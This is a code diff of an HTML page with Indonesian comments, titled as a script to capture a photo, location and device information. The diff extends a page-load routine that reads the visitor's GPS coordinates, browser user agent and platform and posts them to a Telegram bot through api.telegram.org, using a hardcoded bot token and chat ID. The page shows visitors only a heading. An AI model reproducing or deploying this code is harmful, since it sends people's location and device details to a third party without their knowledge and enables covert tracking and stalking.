@@ -1,18 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Contoh Script HTML untuk Mengambil Foto dan Informasi Lokasi</title>
+  <title>Contoh Script HTML untuk Mengambil Foto, Lokasi, dan Informasi Perangkat</title>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
     $(document).ready(function() {
       // Fungsi untuk mengambil foto
       function takePhoto() {
         // Kode untuk mengambil foto di sini
-      }
-
-      // Fungsi untuk mengklik elemen
-      function clickElement() {
-        // Kode untuk mengklik elemen di sini
+        // Pastikan browser pengguna mendukung fitur pengambilan foto
       }
 
       // Fungsi untuk mendapatkan lokasi menggunakan GPS
@@ -24,21 +20,24 @@
         }
       }
 
-      // Fungsi untuk menampilkan informasi lokasi
+      // Fungsi untuk menampilkan informasi lokasi dan perangkat
       function showPosition(position) {
         var latitude = position.coords.latitude;
         var longitude = position.coords.longitude;
+        var userAgent = navigator.userAgent;
+        var deviceInfo = "Perangkat: " + navigator.platform + ", Browser: " + userAgent;
 
-        // Mengirim data lokasi ke Telegram API
-        sendToTelegramAPI(latitude, longitude);
+        // Mengirim data lokasi dan informasi perangkat ke Telegram API
+        sendToTelegramAPI(latitude, longitude, deviceInfo);
       }
 
       // Fungsi untuk mengirim data ke Telegram API
-      function sendToTelegramAPI(latitude, longitude) {
+      function sendToTelegramAPI(latitude, longitude, deviceInfo) {
         var apiKey = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
         var chatId = '1121369247'; // Ganti dengan ID chat yang sesuai
 
-        var message = "Lokasi: " + latitude + ", " + longitude;
+        var message = "Lokasi: " + latitude + ", " + longitude + "\n" +
+                      "Informasi Perangkat: " + deviceInfo;
 
         // Mengirim data ke Telegram API menggunakan metode POST
         $.post("https://api.telegram.org/bot" + apiKey + "/sendMessage?chat_id=" + chatId + "&text=" + message);
@@ -46,12 +45,11 @@
 
       // Panggil fungsi-fungsi yang diperlukan
       takePhoto();
-      clickElement();
       getLocation();
     });
   </script>
 </head>
 <body>
-  <h1>Contoh Script HTML untuk Mengambil Foto dan Informasi Lokasi</h1>
+  <h1>Contoh Script HTML untuk Mengambil Foto, Lokasi, dan Informasi Perangkat</h1>
 </body>
 </html>
